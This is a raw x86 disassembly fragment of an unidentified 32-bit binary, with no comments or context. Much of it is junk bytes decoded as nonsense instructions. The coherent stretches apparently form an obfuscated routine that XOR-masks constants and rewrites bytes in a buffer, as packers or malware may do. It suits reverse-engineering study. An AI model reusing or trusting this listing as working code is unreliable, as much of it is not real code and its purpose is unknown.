  4094f5:	mov    cl,0x4d
  4094f7:	fldcw  WORD PTR [eax]
  4094f9:	push   cs
  4094fa:	std    
  4094fb:	in     al,dx
  4094fc:	xor    ecx,ebx
  4094fe:	inc    eax
  4094ff:	push   ds
  409500:	aam    0xa8
  409502:	int    0xb1
  409504:	adc    al,0x98
  409506:	popa   
  409507:	ret    0x4d6b
  40950a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40950b:	dec    edx
  40950c:	pop    ds
  40950d:	jae    0x4094a1
  40950f:	mov    gs,edi
  409511:	aaa    
  409512:	push   eax
  409513:	fisubr DWORD PTR [ebp-0x1d]
  409516:	xchg   edx,eax
  409517:	or     eax,0xb82688d2
  40951c:	mov    ds:0xa08d1936,al
  409521:	jae    0x40959b
  409523:	jmp    0xcc08:0x63ca9985
  40952a:	nop
  40952b:	cmc    
  40952c:	ds scas eax,DWORD PTR es:[edi]
  40952e:	mov    ebx,0xbd74654b
  409533:	cld    
  409534:	test   BYTE PTR [edi+esi*4-0x4f],0x79
  409539:	pop    edi
  40953a:	out    0x6,eax
  40953c:	and    BYTE PTR [edx+0xe],dh
  40953f:	psadbw mm3,QWORD PTR [esi+ebx*2+0x79]
  409544:	stc    
  409545:	lahf   
  409546:	sub    ah,ah
  409548:	and    ebx,DWORD PTR [ebx-0x4c6b65ec]
  40954e:	jp     0x409502
  409550:	adc    BYTE PTR [ecx+0x70],bh
  409553:	ror    DWORD PTR [eax],cl
  409555:	push   esi
  409556:	inc    esi
  409557:	rcl    esi,cl
  409559:	sub    BYTE PTR [ebx],bl
  40955b:	mov    bl,0x32
  40955d:	rcl    BYTE PTR [ecx+0x1f],1
  409560:	or     al,0x29
  409562:	cld    
  409563:	sub    eax,0x2e46c527
  409568:	sbb    al,0xe5
  40956a:	cmp    ecx,DWORD PTR [ecx-0x135deb1e]
  409570:	mov    eax,0xceed3ad7
  409575:	jge    0x4095a0
  409577:	add    al,BYTE PTR [ebx]
  409579:	sub    ebp,0x26
  40957c:	dec    ecx
  40957d:	mov    ebx,0x8b82acc
  409582:	push   cs
  409583:	push   ebp
  409584:	jae    0x409570
  409586:	sub    al,0xe8
  409588:	push   ecx
  409589:	sub    al,0xa4
  40958b:	jge    0x4095cf
  40958d:	repnz lock sar BYTE PTR ds:0xc915ce3d,1
  409595:	dec    esi
  409596:	call   0xc89c:0x7b67b803
  40959d:	or     al,0xfb
  40959f:	mov    esi,0x10f4bf41
  4095a4:	bound  ebp,QWORD PTR [eax]
  4095a6:	or     DWORD PTR [ebx-0x1fc61b07],ebx
  4095ac:	add    eax,0x9b67ffc2
  4095b1:	inc    eax
  4095b2:	mov    ss,WORD PTR [ebp-0x34]
  4095b5:	mov    WORD PTR [esp+eax*4+0x18],?
  4095b9:	mov    ah,0xce
  4095bb:	cwde   
  4095bc:	xor    BYTE PTR [esi],bh
  4095be:	mov    ch,0x36
  4095c0:	lea    ebp,[edi+0x72]
  4095c3:	adc    BYTE PTR [edi+0xf5a43e3],al
  4095c9:	std    
  4095ca:	sar    DWORD PTR [edx],1
  4095cc:	into   
  4095cd:	retf   0x40e0
  4095d0:	out    dx,eax
  4095d1:	mov    al,ds:0x86c8963
  4095d6:	mov    ds:0x2a8fd66d,al
  4095db:	dec    edi
  4095dc:	fild   WORD PTR [edx+eax*2-0x69]
  4095e0:	pop    edi
  4095e1:	dec    eax
  4095e2:	rcr    BYTE PTR [eax-0x59fc043f],1
  4095e8:	lock xor DWORD PTR [ebp+eax*8-0x54],ecx
  4095ed:	(bad)  
  4095ee:	test   BYTE PTR [eax+0xa],0x1d
  4095f2:	neg    DWORD PTR [esi+0x10]
  4095f5:	dec    DWORD PTR [ecx*8-0x1a9bdd57]
  4095fc:	(bad)  
  4095fd:	in     eax,dx
  4095fe:	ret    0x163b
  409601:	xchg   ecx,eax
  409602:	(bad)  
  409604:	xor    bl,BYTE PTR [ecx]
  409606:	std    
  409607:	aas    
  409608:	and    BYTE PTR [ebx],ah
  40960a:	arpl   bp,ax
  40960c:	xchg   ebx,eax
  40960d:	ds stos BYTE PTR es:[edi],al
  40960f:	mov    eax,0x4e0ece2d
  409614:	in     eax,dx
  409615:	add    DWORD PTR [ebx+ebx*4+0x62],esp
  409619:	ret    
  40961a:	mov    ds:0xfb21e3d5,al
  40961f:	repz cmp cl,BYTE PTR [esi-0xf76c0ac]
  409626:	pop    ebp
  409627:	addr16 cwde 
  409629:	out    0x52,al
  40962b:	mov    edx,DWORD PTR [esi]
  40962d:	shl    eax,0x2
  409630:	mov    DWORD PTR [ebp+0x10],edx
  409633:	mov    edx,DWORD PTR [esi+0x4]
  409636:	xor    eax,0xca79a575
  40963b:	mov    DWORD PTR [ebp+0x14],edx
  40963e:	cmp    eax,DWORD PTR [ebp+0x10]
  409641:	jne    0x4096f4
  409647:	mov    eax,edx
  409649:	cmp    DWORD PTR [ebp+0xc],eax
  40964c:	jne    0x4096f4
  409652:	mov    eax,DWORD PTR [esi]
  409654:	mov    edx,DWORD PTR [esi+0x4]
  409657:	mov    eax,DWORD PTR [esi]
  409659:	mov    edx,DWORD PTR [esi+0x4]
  40965c:	xor    eax,0xca79a577
  409661:	xor    edx,ecx
  409663:	mov    ecx,eax
  409665:	mov    eax,edx
  409667:	shrd   ecx,eax,0x2
  40966b:	shr    eax,0x2
  40966e:	mov    DWORD PTR [ebp+0xc],eax
  409671:	mov    eax,DWORD PTR [esi]
  409673:	mov    edx,DWORD PTR [esi+0x4]
  409676:	mov    edx,eax
  409678:	xor    eax,eax
  40967a:	or     eax,ecx
  40967c:	mov    ecx,DWORD PTR [ebx]
  40967e:	shl    edx,0x1e
  409681:	xor    edx,0x40000000
  409687:	mov    DWORD PTR [ebp+0x10],eax
  40968a:	mov    eax,edx
  40968c:	or     eax,DWORD PTR [ebp+0xc]
  40968f:	mov    edx,DWORD PTR [ebx+0x4]
  409692:	push   eax
  409693:	push   DWORD PTR [ebp+0x10]
  409696:	push   edx
  409697:	push   ecx
  409698:	call   0x416c20
  40969d:	mov    eax,DWORD PTR [esi]
  40969f:	mov    ecx,DWORD PTR [esi+0x4]
  4096a2:	shrd   eax,ecx,0x2
  4096a6:	shr    ecx,0x2
  4096a9:	shr    edx,0x1e
  4096ac:	xor    ecx,0xe706e27a
  4096b2:	push   ecx
  4096b3:	xor    eax,edi
  4096b5:	mov    DWORD PTR [ebp+0x10],edx
  4096b8:	mov    edx,DWORD PTR [ebx]
  4096ba:	mov    edi,DWORD PTR [ebx+0x4]
  4096bd:	push   eax
  4096be:	push   edi
  4096bf:	push   edx
  4096c0:	call   0x416c20
  4096c5:	shld   edx,eax,0x2
  4096c9:	mov    ecx,edx
  4096cb:	xor    edx,edx
  4096cd:	or     ecx,edx
  4096cf:	mov    edx,DWORD PTR [esi]
  4096d1:	mov    edi,DWORD PTR [esi+0x4]
  4096d4:	shl    eax,0x2
  4096d7:	or     eax,DWORD PTR [ebp+0x10]
  4096da:	xor    edi,ecx
  4096dc:	xor    edx,eax
  4096de:	xor    edx,0xca79a575
  4096e4:	xor    edi,0x9c1b89e8
  4096ea:	mov    DWORD PTR [esi],edx
  4096ec:	mov    DWORD PTR [esi+0x4],edi
  4096ef:	jmp    0x40a921
  4096f4:	mov    eax,DWORD PTR [ebp-0x24]
  4096f7:	add    eax,DWORD PTR [ebp-0x4]
  4096fa:	mov    DWORD PTR [ebp-0x28],eax
  4096fd:	mov    eax,DWORD PTR [ebp-0x28]
  409700:	mov    eax,DWORD PTR [ebp-0x4]
  409703:	mov    eax,DWORD PTR [ebp-0x28]
  409706:	mov    eax,DWORD PTR [eax+0xc]
  409709:	mov    edx,DWORD PTR [ebp-0x4]
  40970c:	movzx  eax,WORD PTR [edx+eax*1]
  409710:	cdq    
  409711:	shld   edx,eax,0x2
  409715:	xor    edx,ecx
  409717:	mov    DWORD PTR [ebp+0xc],edx
  40971a:	mov    edx,DWORD PTR [ebp-0x58]
  40971d:	shl    eax,0x2
  409720:	mov    DWORD PTR [ebp+0x10],edx
  409723:	mov    edx,DWORD PTR [ebp-0x54]
  409726:	xor    eax,0xca79a575
  40972b:	mov    DWORD PTR [ebp+0x14],edx
  40972e:	cmp    eax,DWORD PTR [ebp+0x10]
  409731:	jne    0x40a0d1
  409737:	mov    eax,edx
  409739:	cmp    DWORD PTR [ebp+0xc],eax
  40973c:	jne    0x40a0d1
  409742:	mov    DWORD PTR [ebp+0x8],0xca79a575
  409749:	mov    DWORD PTR [ebp+0xc],ecx
  40974c:	mov    DWORD PTR [ebp-0x60],0xca79a571
  409753:	mov    DWORD PTR [ebp-0x5c],ecx
  409756:	mov    DWORD PTR [ebp-0x48],0xca79a57d
  40975d:	mov    DWORD PTR [ebp-0x44],ecx
  409760:	mov    DWORD PTR [ebp-0x38],0xca79a579
  409767:	mov    DWORD PTR [ebp-0x34],ecx
  40976a:	mov    eax,DWORD PTR [ebp+0x8]
  40976d:	mov    ecx,DWORD PTR [ebp+0xc]
  409770:	shrd   eax,ecx,0x2
  409774:	shr    ecx,0x2
  409777:	mov    ecx,DWORD PTR [ebp+0x8]
  40977a:	mov    edx,DWORD PTR [ebp+0xc]
  40977d:	xor    eax,edi
  40977f:	shl    ecx,0x1e
  409782:	xor    edx,edx
  409784:	or     eax,edx
  409786:	add    eax,DWORD PTR ds:0x422598
  40978c:	mov    DWORD PTR [ebp+0x14],eax
  40978f:	mov    eax,DWORD PTR [ebp+0x8]
  409792:	mov    ecx,DWORD PTR [ebp+0xc]
  409795:	shrd   eax,ecx,0x2
  409799:	shr    ecx,0x2
  40979c:	mov    ecx,DWORD PTR [ebp+0x8]
  40979f:	mov    edx,DWORD PTR [ebp+0xc]
  4097a2:	xor    eax,edi
  4097a4:	shl    ecx,0x1e
  4097a7:	xor    edx,edx
  4097a9:	or     eax,edx
  4097ab:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  4097af:	mov    eax,DWORD PTR [ebp+0x14]
  4097b2:	xor    BYTE PTR [eax],cl
  4097b4:	mov    eax,DWORD PTR [ebp-0x60]
  4097b7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4097ba:	shrd   eax,ecx,0x2
  4097be:	shr    ecx,0x2
  4097c1:	mov    ecx,DWORD PTR [ebp-0x60]
  4097c4:	mov    edx,DWORD PTR [ebp-0x5c]
  4097c7:	xor    eax,edi
  4097c9:	shl    ecx,0x1e
  4097cc:	jmp    0x409baa
  4097d1:	or     bh,dh
  4097d3:	cmp    BYTE PTR [esi-0x6574e1dc],dh
  4097d9:	mov    esi,0xd7bca5c6
  4097de:	loope  0x4097b5
  4097e0:	mov    esp,0x18184147
  4097e5:	sahf   
  4097e6:	adc    bl,BYTE PTR [eax]
  4097e8:	sbb    cl,cl
  4097ea:	cmp    al,0xfd
  4097ec:	loope  0x40979a
  4097ee:	cmp    eax,0x46ae82b4
  4097f3:	lods   al,BYTE PTR ds:[esi]
  4097f4:	fwait
  4097f5:	push   ss
  4097f6:	adc    edi,esi
  4097f8:	pop    ds
  4097f9:	push   ds
  4097fa:	popa   
  4097fb:	sub    DWORD PTR [eax-0x71],eax
  4097fe:	fisttp QWORD PTR ds:0xf27db6e0
  409804:	xchg   BYTE PTR [edi-0x50947463],ch
  40980a:	xlat   BYTE PTR ds:[ebx]
  40980b:	xor    ax,0xc375
  40980f:	pop    ds
  409810:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409811:	fdiv   DWORD PTR [ebx]
  409813:	mov    edx,0x9f231742
  409818:	lock es lahf 
  40981b:	cdq    
  40981c:	inc    esp
  40981d:	push   esp
  40981e:	mov    edi,0x710c32bf
  409823:	and    al,0x73
  409825:	mov    esp,0xa6616e14
  40982a:	add    BYTE PTR [ecx-0x3b],0xb6
  40982e:	mov    ebp,0xd9557693
  409833:	add    BYTE PTR [esi-0x55440b7e],bh
  409839:	jg     0x409897
  40983b:	out    dx,eax
  40983c:	into   
  40983d:	jecxz  0x4097d5
  40983f:	xor    BYTE PTR [edi+0x12314928],bl
  409845:	out    dx,eax
  409846:	ror    DWORD PTR [edx+0x768104d9],cl
  40984c:	jbe    0x409889
  40984e:	mov    al,ds:0x67a3ba4f
  409853:	icebp  
  409854:	lahf   
  409855:	jg     0x4098a5
  409857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409858:	and    esp,DWORD PTR [edi-0x987594b]
  40985e:	je     0x4097ec
  409860:	mov    fs,WORD PTR [ecx]
  409862:	ss icebp 
  409864:	or     DWORD PTR [eax+0x25fa42d0],ebx
  40986a:	aam    0x84
  40986c:	imul   ebp,DWORD PTR [ebp+0x3d77ecbf],0x77
  409873:	pop    esi
  409874:	ret    0x9ca1
  409877:	retf   
  409878:	addr16 mov edi,0x4922a4d6
  40987e:	sti    
  40987f:	adc    al,0x34
  409881:	sbb    DWORD PTR [eax+0x3c],ebx
  409884:	out    0xcb,eax
  409886:	xchg   ebp,eax
  409887:	sub    dl,BYTE PTR [ebx+0x35]
  40988a:	mov    ch,0xd7
  40988c:	test   BYTE PTR [esp+ecx*1+0x69],cl
  409890:	cmp    BYTE PTR [ebx],dl
  409892:	fild   WORD PTR [ebp+0x2074de22]
  409898:	mov    ds:0x506b2c0a,al
  40989d:	pop    ss
  40989e:	inc    ebx
  40989f:	bound  edi,QWORD PTR [edi-0x5b59fa1c]
  4098a5:	jb     0x4098e3
  4098a7:	jmp    0x409854
  4098a9:	pushf  
  4098aa:	fcmovb st,st(5)
  4098ac:	inc    eax
  4098ad:	mov    WORD PTR [ebx+0x5e],gs
  4098b0:	mov    ebx,0x8266f77a
  4098b5:	nop
  4098b6:	sahf   
  4098b7:	sub    BYTE PTR [esi],0x8a
  4098ba:	pop    ss
  4098bb:	mul    DWORD PTR [eax-0x40a6e5c]
  4098c1:	jnp    0x40991f
  4098c3:	sbb    esi,ebp
  4098c5:	inc    ecx
  4098c6:	sbb    dl,dh
  4098c8:	jbe    0x409900
  4098ca:	mov    edx,0x72edca38
  4098cf:	int    0xf
  4098d1:	mov    fs,esi
  4098d3:	mov    dh,0xc2
  4098d5:	cmp    DWORD PTR [eiz*2-0x3dcc79e3],esi
  4098dc:	cs inc edi
  4098de:	and    eax,0xc2a4f40e
  4098e3:	push   0xe8cbdb86
  4098e8:	je     0x4098b7
  4098ea:	std    
  4098eb:	js     0x409938
  4098ed:	jo     0x40989b
  4098ef:	in     eax,dx
  4098f0:	js     0x409911
  4098f2:	sbb    ch,ch
  4098f4:	mov    ds:0x73b9aa0a,eax
  4098f9:	sub    eax,ebx
  4098fb:	mov    bl,0xb2
  4098fd:	xor    BYTE PTR [eax+0x5c],al
  409900:	test   edi,0xec570274
  409906:	add    DWORD PTR ds:[eax],edi
  409909:	test   ebp,esp
  40990b:	shl    BYTE PTR [edi-0x412a62cb],cl
  409911:	gs jae 0x4098e5
  409914:	call   0x7510242f
  409919:	test   eax,0x42a6aed
  40991e:	xchg   DWORD PTR [esi],edi
  409920:	clc    
  409921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409922:	jns    0x4098c9
  409924:	sub    dh,BYTE PTR [esi-0x6e]
  409927:	scas   eax,DWORD PTR es:[edi]
  409928:	xchg   ebx,eax
  409929:	shl    DWORD PTR [eax-0x527d8bc2],cl
  40992f:	and    BYTE PTR [edx],ch
  409931:	lahf   
  409932:	pop    eax
  409933:	pop    es
  409934:	sub    ah,BYTE PTR [eax-0xc32f3e5]
  40993a:	(bad)  
  40993b:	push   edx
  40993c:	mov    eax,ds:0x127f2ad1
  409941:	stos   DWORD PTR es:[edi],eax
  409942:	mov    esi,0xce365493
  409947:	dec    esp
  409948:	add    eax,0xe7af2b26
  40994d:	add    BYTE PTR [edi],ah
  40994f:	fadd   st(0),st
  409951:	arpl   WORD PTR [edi],ax
  409953:	jae    0x4098f7
  409955:	ja     0x409968
  409957:	pop    ds
  409958:	add    BYTE PTR [ecx-0x50],ch
  40995b:	inc    esp
  40995c:	mov    bl,0x3a
  40995e:	sbb    edi,DWORD PTR [edx+0x49]
  409961:	lock sub esi,DWORD PTR [eiz*4+0x18e2d9d5]
  409969:	test   DWORD PTR [esi+0x60],esp
  40996c:	ret    0x6eec
  40996f:	sub    ebx,ebp
  409971:	xchg   ecx,eax
  409972:	sahf   
  409973:	pop    ebp
  409974:	adc    al,bh
  409976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409977:	jmp    0x9ff8307a
  40997c:	repz mov edi,0xb8340492
  409982:	stc    
  409983:	xor    DWORD PTR [esi-0x2ae1ea69],edx
  409989:	dec    ecx
  40998a:	aaa    
  40998b:	lock scas eax,DWORD PTR es:[edi]
  40998d:	cwde   
  40998e:	(bad)  
  40998f:	out    dx,al
  409990:	fild   WORD PTR [eax]
  409992:	or     bl,BYTE PTR [eax-0x7dcbacfc]
  409998:	ins    DWORD PTR es:[edi],dx
  409999:	and    eax,0xde5b8826
  40999e:	and    DWORD PTR [edi+ebp*1-0x328e178d],edx
  4099a5:	xchg   edi,eax
  4099a6:	xor    dh,cl
  4099a8:	or     al,0xd6
  4099aa:	or     eax,0x9a035321
  4099af:	add    edx,ebp
  4099b1:	in     al,dx
  4099b2:	ins    DWORD PTR es:[edi],dx
  4099b3:	bound  edx,QWORD PTR [ecx-0x41362f0d]
  4099b9:	mov    ebx,0x2bd77fea
  4099be:	or     al,0x41
  4099c0:	iret   
  4099c1:	or     edi,ecx
  4099c3:	mov    ds:0x2d16ef6d,eax
  4099c8:	jmp    0x40996a
  4099ca:	xchg   esp,eax
  4099cb:	mov    ds:0x9222fd82,al
  4099d0:	and    BYTE PTR [edx],0x99
  4099d3:	aam    0x71
  4099d5:	and    bh,BYTE PTR [edx]
  4099d7:	int    0x4b
  4099d9:	out    dx,al
  4099da:	cwde   
  4099db:	(bad)  
  4099dd:	xor    ebx,ebp
  4099df:	test   al,0xaa
  4099e1:	add    edx,0xffffffb3
  4099e4:	enter  0x8e4a,0x9b
  4099e8:	adc    bl,BYTE PTR [eax]
  4099ea:	or     al,0x26
  4099ec:	ja     0x409a52
  4099ee:	(bad)  
  4099ef:	pop    ebp
  4099f0:	int    0x46
  4099f2:	daa    
  4099f3:	and    eax,0xc0c42966
  4099f8:	dec    ecx
  4099f9:	sbb    DWORD PTR [ebx+0x3e],0x4c473211
  409a00:	(bad)  
  409a01:	push   ebp
  409a02:	add    ch,0x71
  409a05:	xchg   edx,eax
  409a06:	cmc    
  409a07:	mov    edi,0xc7bdc12e
  409a0c:	aad    0x6e
  409a0e:	call   0x5c57:0xb82c866f
  409a15:	adc    eax,DWORD PTR [eax+0x60]
  409a18:	icebp  
  409a19:	jecxz  0x409a48
  409a1b:	add    BYTE PTR [ebx-0x3d5ac89f],dh
  409a21:	stc    
  409a22:	cmp    ebp,DWORD PTR es:0xface2957
  409a29:	jo     0x4099ba
  409a2b:	mov    bh,0xbf
  409a2d:	dec    esi
  409a2e:	and    al,dl
  409a30:	paddb  mm4,QWORD PTR [edi+0x6a]
  409a34:	js     0x409a54
  409a36:	jmp    0xec95b5bd
  409a3b:	push   esi
  409a3c:	inc    esi
  409a3d:	xor    eax,0x4cf4b5e2
  409a42:	in     eax,0x71
  409a44:	lock push ebx
  409a46:	mov    ch,0xd1
  409a48:	push   ebx
  409a49:	xor    DWORD PTR [eax],esi
  409a4b:	scas   al,BYTE PTR es:[edi]
  409a4c:	xor    esi,eax
  409a4e:	popf   
  409a4f:	sub    BYTE PTR [ebx-0x39],bl
  409a52:	push   edi
  409a53:	inc    ecx
  409a54:	push   ds
  409a55:	push   0x4fac9ab
  409a5a:	mov    DWORD PTR [ecx+esi*1+0x55],0xd2e92a0b
  409a62:	sbb    bh,BYTE PTR [ecx+0x3c]
  409a65:	jecxz  0x409a1e
  409a67:	sub    eax,0xaadecf0
  409a6c:	add    eax,DWORD PTR [ebx+edx*1]
  409a6f:	repz push edx
  409a71:	dec    bh
  409a73:	push   edi
  409a74:	sub    eax,0xd9284f00
  409a79:	fcom   DWORD PTR [edx]
  409a7b:	fcom   st(5)
  409a7d:	clc    
  409a7e:	arpl   WORD PTR [ecx+ebx*1+0x4c2733f3],cx
  409a85:	mov    eax,ds:0xd9c64f7a
  409a8a:	jle    0x409a7d
  409a8c:	call   0x7205:0x9ed8d68e
  409a93:	out    dx,eax
  409a94:	rcr    BYTE PTR [esp+edi*2+0x73],0x43
  409a99:	push   ss
  409a9a:	inc    ecx
  409a9b:	mov    esi,0xa02e0f2
  409aa0:	repz mov eax,0x5a06fa0c
  409aa6:	aas    
  409aa7:	mov    cl,0x35
  409aa9:	int    0x9c
  409aab:	inc    ebx
  409aac:	or     ah,0x51
  409aaf:	out    0x2b,eax
  409ab1:	dec    edx
  409ab2:	mov    bl,0xb0
  409ab4:	cmp    al,0x6
  409ab6:	dec    ebx
  409ab7:	push   eax
  409ab8:	icebp  
  409ab9:	inc    ebp
  409aba:	pusha  
  409abb:	pusha  
  409abc:	lds    esi,FWORD PTR [ecx]
  409abe:	out    dx,al
  409abf:	mov    cl,0xc0
  409ac1:	add    bh,BYTE PTR ss:[ecx]
  409ac4:	xchg   esi,eax
  409ac5:	sub    ebx,ebx
  409ac7:	adc    eax,0xcfcc0361
  409acc:	fmul   st(2),st
  409ace:	sub    cl,BYTE PTR [ecx-0x49]
  409ad1:	mov    bl,ah
  409ad3:	push   eax
  409ad4:	les    edx,FWORD PTR ds:0x402669f8
  409ada:	pop    ecx
  409adb:	jo     0x409a92
  409add:	mov    DWORD PTR [edx+0x53],esp
  409ae0:	mov    al,BYTE PTR [edi-0x2cb7bc28]
  409ae6:	test   BYTE PTR [ecx+0x3673563b],cl
  409aec:	ds (bad) 
  409aee:	idiv   BYTE PTR [esp+eax*8-0x5c5e6255]
  409af5:	test   BYTE PTR [ebp+esi*2-0x20],bh
  409af9:	test   BYTE PTR [ebx],dl
  409afb:	sbb    DWORD PTR [edx+0x7e1a37d9],esi
  409b01:	and    eax,0xfa5149d6
  409b06:	emms   
  409b08:	aam    0x1d
  409b0a:	lock xchg esp,eax
  409b0c:	int    0xcd
  409b0e:	clts   
  409b10:	dec    eax
  409b11:	pop    ecx
  409b12:	leave  
  409b13:	fstp   TBYTE PTR [edx-0x19855025]
  409b19:	popa   
  409b1a:	mov    WORD PTR [eax+0x79],cs
  409b1d:	xchg   edi,ecx
  409b1f:	adc    edx,DWORD PTR [ebx+0x65f4dbe8]
  409b25:	ret    0xfc0f
  409b28:	in     eax,0xe2
  409b2a:	or     BYTE PTR [eax],cl
  409b2c:	jae    0x409b42
  409b2e:	stc    
  409b2f:	jle    0x409b41
  409b31:	aas    
  409b32:	sahf   
  409b33:	or     al,bh
  409b35:	mov    ebx,0xf32f3bd4
  409b3a:	(bad)  
  409b3b:	sub    eax,0xa5586043
  409b40:	pop    es
  409b41:	jne    0x9ad50012
  409b47:	mov    bh,0x4
  409b49:	push   edi
  409b4a:	jle    0x409ba2
  409b4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b4d:	inc    ebx
  409b4e:	push   es
  409b4f:	pop    edx
  409b50:	das    
  409b51:	aad    0x8
  409b53:	fsubr  QWORD PTR [esp+esi*2]
  409b56:	das    
  409b57:	outs   dx,DWORD PTR ds:[esi]
  409b58:	iret   
  409b59:	xor    eax,0x6352b996
  409b5e:	mov    ecx,?
  409b60:	ret    
  409b61:	leave  
  409b62:	jecxz  0x409b8d
  409b64:	out    dx,eax
  409b65:	pop    edx
  409b66:	(bad)  
  409b67:	or     eax,0x81e02af2
  409b6c:	repz jecxz 0x409be7
  409b6f:	xor    BYTE PTR [ebx+0x3429a341],0x87
  409b76:	out    dx,al
  409b77:	outs   dx,DWORD PTR ds:[esi]
  409b78:	lods   al,BYTE PTR ds:[esi]
  409b79:	in     al,0x60
  409b7b:	dec    esp
  409b7c:	sub    al,0x72
  409b7e:	jle    0x409bd6
  409b80:	jbe    0x409b5e
  409b82:	inc    esi
  409b83:	(bad)  
  409b84:	ins    DWORD PTR es:[edi],dx
  409b85:	push   ds
  409b86:	jnp    0x409ba5
  409b88:	mov    esp,0x71153906
  409b8d:	adc    ebx,esp
  409b8f:	mov    ds:0x400caefe,eax
  409b94:	mov    ebp,0x1fd29f51
  409b99:	push   es
  409b9a:	cmp    BYTE PTR [edi+eiz*2+0x3e],dh
  409b9e:	in     eax,0xff
  409ba0:	mov    ds:0x9b9462fa,al
  409ba5:	cmp    dh,BYTE PTR [eax]
  409ba7:	pop    ebp
  409ba8:	aad    0x99
  409baa:	xor    edx,edx
  409bac:	or     eax,edx
  409bae:	add    eax,DWORD PTR ds:0x422598
  409bb4:	mov    DWORD PTR [ebp+0x14],eax
  409bb7:	mov    eax,DWORD PTR [ebp-0x60]
  409bba:	mov    ecx,DWORD PTR [ebp-0x5c]
  409bbd:	shrd   eax,ecx,0x2
  409bc1:	shr    ecx,0x2
  409bc4:	mov    ecx,DWORD PTR [ebp-0x60]
  409bc7:	mov    edx,DWORD PTR [ebp-0x5c]
  409bca:	xor    eax,edi
  409bcc:	shl    ecx,0x1e
  409bcf:	xor    edx,edx
  409bd1:	or     eax,edx
  409bd3:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409bd7:	mov    eax,DWORD PTR [ebp+0x14]
  409bda:	or     BYTE PTR [eax],cl
  409bdc:	mov    eax,DWORD PTR [ebp-0x48]
  409bdf:	mov    ecx,DWORD PTR [ebp-0x44]
  409be2:	shrd   eax,ecx,0x2
  409be6:	shr    ecx,0x2
  409be9:	mov    ecx,DWORD PTR [ebp-0x48]
  409bec:	mov    edx,DWORD PTR [ebp-0x44]
  409bef:	xor    eax,edi
  409bf1:	xor    edx,edx
  409bf3:	or     eax,edx
  409bf5:	add    eax,DWORD PTR ds:0x422598
  409bfb:	shl    ecx,0x1e
  409bfe:	mov    DWORD PTR [ebp+0x14],eax
  409c01:	mov    eax,DWORD PTR [ebp-0x48]
  409c04:	mov    ecx,DWORD PTR [ebp-0x44]
  409c07:	shrd   eax,ecx,0x2
  409c0b:	shr    ecx,0x2
  409c0e:	mov    ecx,DWORD PTR [ebp-0x48]
  409c11:	mov    edx,DWORD PTR [ebp-0x44]
  409c14:	xor    eax,edi
  409c16:	shl    ecx,0x1e
  409c19:	xor    edx,edx
  409c1b:	or     eax,edx
  409c1d:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409c21:	mov    eax,DWORD PTR [ebp+0x14]
  409c24:	add    BYTE PTR [eax],cl
  409c26:	mov    eax,DWORD PTR [ebp-0x38]
  409c29:	mov    ecx,DWORD PTR [ebp-0x34]
  409c2c:	shrd   eax,ecx,0x2
  409c30:	shr    ecx,0x2
  409c33:	mov    ecx,DWORD PTR [ebp-0x38]
  409c36:	mov    edx,DWORD PTR [ebp-0x34]
  409c39:	xor    edx,edx
  409c3b:	xor    eax,edi
  409c3d:	or     eax,edx
  409c3f:	add    eax,DWORD PTR ds:0x422598
  409c45:	shl    ecx,0x1e
  409c48:	mov    ecx,DWORD PTR [ebp-0x38]
  409c4b:	mov    edx,DWORD PTR [ebp-0x34]
  409c4e:	shrd   ecx,edx,0x2
  409c52:	xor    ecx,edi
  409c54:	shr    edx,0x2
  409c57:	mov    edx,DWORD PTR [ebp-0x38]
  409c5a:	mov    edi,DWORD PTR [ebp-0x34]
  409c5d:	xor    edi,edi
  409c5f:	or     ecx,edi
  409c61:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  409c65:	or     BYTE PTR [eax],cl
  409c67:	shl    edx,0x1e
  409c6a:	mov    edx,DWORD PTR [ebx]
  409c6c:	mov    eax,DWORD PTR [ebx+0x4]
  409c6f:	mov    edi,DWORD PTR [ebx]
  409c71:	mov    ecx,DWORD PTR [ebx+0x4]
  409c74:	xor    edx,0xca79a577
  409c7a:	xor    eax,0x9c1b89e8
  409c7f:	shrd   edx,eax,0x2
  409c83:	xor    ecx,ecx
  409c85:	or     ecx,edx
  409c87:	mov    DWORD PTR [ebp+0x8],ecx
  409c8a:	mov    ecx,DWORD PTR [esi]
  409c8c:	mov    edx,DWORD PTR [esi+0x4]
  409c8f:	xor    edx,0x9c1b89e8
  409c95:	xor    ecx,0xca79a577
  409c9b:	mov    DWORD PTR [ebp+0x14],ecx
  409c9e:	mov    ecx,edx
  409ca0:	mov    edx,DWORD PTR [ebp+0x14]
  409ca3:	shrd   edx,ecx,0x2
  409ca7:	shr    eax,0x2
  409caa:	shl    edi,0x1e
  409cad:	mov    DWORD PTR [ebp-0x6c],eax
  409cb0:	mov    DWORD PTR [ebp-0x70],edx
  409cb3:	mov    edx,DWORD PTR [esi]
  409cb5:	mov    eax,0x40000000
  409cba:	xor    edi,eax
  409cbc:	or     edi,DWORD PTR [ebp-0x6c]
  409cbf:	mov    DWORD PTR [ebp+0x14],edx
  409cc2:	shl    DWORD PTR [ebp+0x14],0x1e
  409cc6:	xor    DWORD PTR [ebp+0x14],eax
  409cc9:	mov    DWORD PTR [ebp+0xc],edi
  409ccc:	jmp    0x40a0aa
  409cd1:	jbe    0x409d4e
  409cd3:	fstp   TBYTE PTR [edx+ebx*8-0x78e4c9e4]
  409cda:	ins    DWORD PTR es:[edi],dx
  409cdb:	cmp    DWORD PTR [edx+eiz*8+0x50],0xffffffa1
  409ce0:	jo     0x409caf
  409ce2:	cmp    DWORD PTR [eax],ebx
  409ce4:	sbb    BYTE PTR [esi-0x69e7e7ee],bl
  409cea:	add    BYTE PTR [esi],ch
  409cec:	xor    BYTE PTR [esi],dh
  409cee:	push   0xcbb28aca
  409cf3:	add    BYTE PTR [esi+0x7a],0x0
  409cf7:	out    0xc9,al
  409cf9:	fsin   
  409cfb:	inc    ebx
  409cfc:	stc    
  409cfd:	out    dx,eax
  409cfe:	sub    dl,BYTE PTR [ecx+0x20]
